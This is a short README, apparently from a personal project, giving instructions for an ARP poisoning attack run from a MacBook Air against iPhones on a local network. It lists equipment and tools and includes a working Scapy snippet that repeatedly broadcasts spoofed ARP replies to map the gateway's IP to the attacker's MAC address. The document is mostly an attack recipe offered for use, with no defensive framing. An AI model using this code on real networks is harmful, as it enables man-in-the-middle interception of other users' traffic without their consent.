## This is the instruction of how to apply arp poison attack by using Macbook Air

### Equipment

> Macbook Air 11 macOS Mojave 10.14
> iPhone 8 Plus iOS 13.3
> iPhone 6 iOS 12.4.1

### Prerequisite

> Scapy
> Wireshark is recommended

### The main code is as below

```
#   victim's arp cache has been substituded. The gateway's IP(192.168.0.1) mapped to attack's hardware address(MAC address).
    p1=Ether(dst="ff:ff:ff:ff:ff:ff",src="48:d7:05:c1:d6:63")/ARP(pdst=victimAddr,psrc=gatewayAddr)
    for i in range(6000):
        sendp(p1)
        time.sleep(0.1)
        
```

### reference

> Please refer to [https://blog.csdn.net/qq_38684504/article/details/87955468]
